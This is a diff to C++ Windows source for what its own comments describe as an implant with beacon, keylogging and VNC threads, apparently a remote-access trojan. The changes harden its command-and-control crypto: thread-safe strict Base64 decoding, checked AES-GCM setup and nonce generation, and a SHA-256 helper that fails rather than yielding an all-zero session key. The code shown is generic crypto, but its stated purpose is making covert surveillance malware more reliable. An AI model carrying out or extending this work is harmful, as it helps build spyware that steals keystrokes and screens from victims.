@@ -11,6 +11,7 @@
 #include <random>
 #include <chrono>
 #include <algorithm>
+#include <array>
 #include <lmcons.h>
 
 #ifdef _MSC_VER
@@ -70,21 +71,39 @@ std::string Base64Encode(const BYTE* data, size_t len) {
 }
 
 std::vector<BYTE> Base64Decode(const std::string& b64) {
-    static int inv[256];
-    static bool init = false;
-    if (!init) {
-        for (int i = 0; i < 256; ++i) inv[i] = -1;
-        for (int i = 0; i < 64; ++i) inv[(unsigned char)B64[i]] = i;
-        inv[(unsigned char)'='] = 0;
-        init = true;
-    }
+    // Built once through a magic static, which C++11 guarantees is initialised
+    // exactly once even under concurrent entry. The previous shape was
+    // `static int inv[256]` guarded by `static bool init`, read-modified with no
+    // synchronisation: Base64Decode runs on the beacon, keylog and VNC threads,
+    // so two of them could be writing the table while the other decoded with it.
+    static const std::array<int, 256> INV = [] {
+        std::array<int, 256> t;
+        for (int i = 0; i < 256; ++i) t[i] = -1;
+        for (int i = 0; i < 64; ++i) t[(unsigned char)B64[i]] = i;
+        t[(unsigned char)'='] = 0;
+        return t;
+    }();
+
     std::vector<BYTE> out;
     if (b64.size() % 4 != 0) return out;
     out.reserve((b64.size() / 4) * 3);
     for (size_t i = 0; i < b64.size(); i += 4) {
         uint32_t block = 0;
+        bool sawPad = false;
         for (int j = 0; j < 4; ++j) {
-            int v = inv[(unsigned char)b64[i + j]];
+            const char c = b64[i + j];
+            // Padding is only legal as trailing characters of the final
+            // quartet. Accepting '=' anywhere mapped it to zero and produced
+            // bytes from malformed input, so a corrupt frame surfaced as an
+            // authentication-tag failure instead of a decode failure.
+            if (c == '=') {
+                if (j < 2 || i + 4 != b64.size()) return {};
+                sawPad = true;
+                block <<= 6;
+                continue;
+            }
+            if (sawPad) return {};
+            int v = INV[(unsigned char)c];
             if (v < 0) return {};
             block = (block << 6) | static_cast<uint32_t>(v);
         }
@@ -110,10 +129,15 @@ std::string AesGcmEncrypt(const std::vector<BYTE>& key,
             &hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0)))
         return {};
 
-    // Set GCM chaining mode
-    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
+    // AES defaults to CBC in BCrypt. An unchecked failure here silently
+    // encrypts under a mode the server never expects, so the beacon returns
+    // garbage instead of surfacing a crypto-negotiation error. Fail closed.
+    if (!BCRYPT_SUCCESS(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                       (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
-                      sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
+                      sizeof(BCRYPT_CHAIN_MODE_GCM), 0))) {
+        BCryptCloseAlgorithmProvider(hAlg, 0);
+        return {};
+    }
 
     BCRYPT_KEY_HANDLE hKey = nullptr;
     if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(
@@ -123,9 +147,16 @@ std::string AesGcmEncrypt(const std::vector<BYTE>& key,
         return {};
     }
 
-    // Random 12-byte nonce
+    // Random 12-byte nonce. GCM loses both confidentiality and authenticity
+    // if a nonce ever repeats under the same key, so a failed RNG must abort
+    // this beacon rather than fall through with the zero-filled buffer.
     BYTE nonce[12] = {};
-    BCryptGenRandom(nullptr, nonce, 12, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
+    if (!BCRYPT_SUCCESS(BCryptGenRandom(nullptr, nonce, 12,
+                                        BCRYPT_USE_SYSTEM_PREFERRED_RNG))) {
+        BCryptDestroyKey(hKey);
+        BCryptCloseAlgorithmProvider(hAlg, 0);
+        return {};
+    }
 
     BYTE tag[16] = {};
     BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
@@ -139,13 +170,16 @@ std::string AesGcmEncrypt(const std::vector<BYTE>& key,
     // The sizing call advances BCrypt's internal GCM counter before the real encrypt,
     // producing a ciphertext with a tag that verifies nothing on the other side.
     const ULONG cbPlaintext = static_cast<ULONG>(plaintext.size());
-    std::vector<BYTE> ciphertext(cbPlaintext);
+    // Never size the buffer to zero: an empty plaintext would hand BCrypt a
+    // NULL pbOutput, which is the sizing call forbidden above. The scratch byte
+    // keeps the pointer valid; cbResult still comes back 0.
+    std::vector<BYTE> ciphertext(cbPlaintext ? cbPlaintext : 1);
     ULONG cbResult = 0;
     NTSTATUS st = BCryptEncrypt(
         hKey,
         (PUCHAR)plaintext.data(), cbPlaintext,
         &authInfo, nullptr, 0,
-        ciphertext.data(), cbPlaintext, &cbResult, 0);
+        ciphertext.data(), static_cast<ULONG>(ciphertext.size()), &cbResult, 0);
 
     BCryptDestroyKey(hKey);
     BCryptCloseAlgorithmProvider(hAlg, 0);
@@ -184,9 +218,14 @@ std::string AesGcmDecrypt(const std::vector<BYTE>& key,
             &hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0)))
         return {};
 
-    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
+    // See the matching check in AesGcmEncrypt: without this the decrypt side
+    // can run under CBC and report a plain tag-mismatch failure.
+    if (!BCRYPT_SUCCESS(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                       (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
-                      sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
+                      sizeof(BCRYPT_CHAIN_MODE_GCM), 0))) {
+        BCryptCloseAlgorithmProvider(hAlg, 0);
+        return {};
+    }
 
     BCRYPT_KEY_HANDLE hKey = nullptr;
     if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(
@@ -221,18 +260,27 @@ std::string AesGcmDecrypt(const std::vector<BYTE>& key,
 // SHA-256 over raw bytes
 // ---------------------------------------------------------------------------
 
+// Returns an EMPTY vector on failure. Every step is checked because the only
+// caller (EcdhDeriveSessionKey) validates the result by length. Pre-sizing the
+// return to 32 zero bytes made a failed CryptAcquireContext look like a
+// successful digest, so the implant would accept an all-zero channel key and
+// beacon under a key anyone could reproduce.
 std::vector<BYTE> Sha256Bytes(const BYTE* data, size_t len) {
-    std::vector<BYTE> out(32, 0);
+    std::vector<BYTE> out;
     HCRYPTPROV hProv = 0;
     HCRYPTHASH hHash = 0;
     if (!CryptAcquireContextA(&hProv, nullptr, nullptr, PROV_RSA_AES,
                               CRYPT_VERIFYCONTEXT))
         return out;
     if (CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
-        CryptHashData(hHash, const_cast<BYTE*>(data),
-                      static_cast<DWORD>(len), 0);
-        DWORD cb = 32;
-        CryptGetHashParam(hHash, HP_HASHVAL, out.data(), &cb, 0);
+        if (CryptHashData(hHash, const_cast<BYTE*>(data),
+                          static_cast<DWORD>(len), 0)) {
+            out.resize(32);
+            DWORD cb = 32;
+            if (!CryptGetHashParam(hHash, HP_HASHVAL, out.data(), &cb, 0) ||
+                cb != 32)
+                out.clear();
+        }
         CryptDestroyHash(hHash);
     }
     CryptReleaseContext(hProv, 0);
